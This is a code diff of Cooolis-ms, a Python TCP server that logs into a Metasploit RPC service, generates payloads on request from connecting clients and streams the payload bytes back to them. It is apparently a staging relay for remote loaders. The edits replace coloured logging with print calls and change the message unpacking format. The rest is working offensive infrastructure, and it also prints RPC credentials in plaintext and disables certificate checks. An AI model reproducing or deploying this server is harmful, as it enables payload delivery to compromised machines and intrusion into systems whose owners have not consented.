@@ -1,3 +1,4 @@
+
 """
 Cooolis-ms
 ------------
@@ -11,7 +12,6 @@ import msgpack
 import ssl
 import sys
 import json
-import term
 import struct
 from socketserver import BaseRequestHandler,ThreadingTCPServer
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -50,7 +50,7 @@ class Metasploit_RPC(BaseRequestHandler):
 
     def _request(self,options):
         try:
-            term.writeLine("[*]API URL : {url} , Method : {method}".format(url=self.url,method=options[0]), term.green)
+            print("[*]API URL : {url} , Method : {method}".format(url=self.url,method=options[0]))
             options = self.__pack(options)
             req  = requests.post(self.url,verify=False,headers=self.headers,data=options)
             result = self.__unpack(req.content)
@@ -67,7 +67,7 @@ class Metasploit_RPC(BaseRequestHandler):
         
         result = self._request(options)
         self.token = str(result[b'token'],encoding = "utf8")
-        term.writeLine("[*]Token: {token} Username : {username} Password : {password}".format(token=self.token,username=self.username,password=self.password),term.green)
+        print("[*]Token: {token} Username : {username} Password : {password}".format(token=self.token,username=self.username,password=self.password))
     
     # 打包数据
     def __pack(self,pack_str):
@@ -78,19 +78,18 @@ class Metasploit_RPC(BaseRequestHandler):
         return msgpack.unpackb(pack_str)
 
     def __send_payload(self,payload,options):
-        term.writeLine("[*]PAYLOAD: {payload}".format(payload=payload),term.green)
+        print("[*]PAYLOAD: {payload}".format(payload=payload))
         pack_data = ["module.execute",self.token,"payload",payload,options]
         return self._request(pack_data)
 
     def handle(self):
-        term.writeLine("[*]New connection: {client}".format(client=self.client_address),term.green)
+        print("[*]New connection: {client}".format(client=self.client_address))
         self._get_token()
         while True:
             data = self.request.recv(1024)
             if not data:break
             try:
-                data = struct.unpack(">200s200s200sLHH",data)
-                # print(data)
+                data = struct.unpack(">200s200s",data)
                 options = {}
                 str_json = data[1].decode('UTF-8')
                 str_json = str_json.strip('\x00')
@@ -109,7 +108,7 @@ class Metasploit_RPC(BaseRequestHandler):
                 self.request.send(recv_payload[b'payload'])
                 self.request.close()
             except Exception as e:
-                term.writeLine("[!]{error}".format(error=str(e)),term.red)
+                print("[!]{error}".format(error=str(e)))
                 pass
             finally:
                 break
@@ -128,10 +127,12 @@ def main():
     args.add_argument('-s','--ssl',help='Enable ssl, Default: True',action="store_true",default=True)
     args.add_argument('-v','--versobe',help='Enable debug',action="store_true")
     parser = args.parse_args()
-    term.writeLine("[*]Server Host : {host} , Server Port : {port}".format(host=parser.server,port=parser.listen), term.green)
+    print("[*]Server Host : {host} , Server Port : {port}".format(host=parser.server,port=parser.listen))
     server = ThreadingTCPServer((parser.server,parser.listen),Metasploit_RPC.Creator(parser))
     server.serve_forever()
     
 if __name__ == "__main__":
     main()
     
+
+
